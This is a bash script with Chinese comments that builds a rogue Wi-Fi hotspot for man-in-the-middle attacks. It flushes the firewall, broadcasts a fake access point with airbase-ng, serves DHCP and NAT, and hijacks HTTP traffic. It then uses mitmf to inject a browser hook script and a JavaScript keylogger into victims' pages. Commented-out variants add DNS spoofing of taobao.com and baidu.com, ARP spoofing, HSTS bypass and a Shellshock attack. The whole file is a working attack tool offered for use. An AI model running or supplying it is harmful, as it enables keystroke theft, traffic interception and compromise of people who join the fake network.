iptables -t nat -F
iptables -t nat -X  
iptables -t nat -P PREROUTING ACCEPT  
iptables -t nat -P POSTROUTING ACCEPT  
iptables -t nat -P OUTPUT ACCEPT  
iptables -t mangle -F  
iptables -t mangle -X  
iptables -t mangle -P PREROUTING ACCEPT  
iptables -t mangle -P INPUT ACCEPT  
iptables -t mangle -P FORWARD ACCEPT  
iptables -t mangle -P OUTPUT ACCEPT  
iptables -t mangle -P POSTROUTING ACCEPT  
iptables -F  
iptables -X  
iptables -P FORWARD ACCEPT  
iptables -P INPUT ACCEPT  
iptables -P OUTPUT ACCEPT  
iptables -t raw -F  
iptables -t raw -X  
iptables -t raw -P PREROUTING ACCEPT  
iptables -t raw -P OUTPUT ACCEPT  
#建立热点
airmon-ng stop mon0
ifconfig wlan0 down           
iwconfig wlan0 mode monitor
ifconfig wlan0 up
airmon-ng start wlan0 &
sleep 2                  
gnome-terminal -x bash -c "airbase-ng -e ing -c 11 wlan0"              #按需求修改
sleep 2
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
echo 1 > /proc/sys/net/ipv4/ip_forward
#配置dhcp
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
sleep 2
/etc/init.d/isc-dhcp-server start 
#nat
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356
#劫持80
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#劫持dns
#gnome-terminal -x bash -c "dnschef -i 10.0.0.1 --nameserver 114.114.114.114"

#gnome-terminal -x bash -c "dnschef --fakedomains=taobao.com,baidu.com --fakeip=10.0.0.1 -i 10.0.0.1 --nameserver 114.114.114.114"

#进行80js键盘记录
gnome-terminal -x bash -c "mitmf -i at0 --inject --js-url http://10.0.0.1:3000/hook.js --jskeylogger"
#gnome-terminal -x bash -c "mitmf -i at0 --target 10.0.0.12 --gateway 10.0.0.1 --arp --spoof --hsts"
#gnome-terminal -x bash -c "mitmf --iface a0 --spoof --dhcp --shellshock"
#gnome-terminal -x bash -c "mitmf -i at0 --spoof --arp --gateway 10.0.0.1 --target 10.0.0.12 --inject --html-url http://www.freebuf.com"

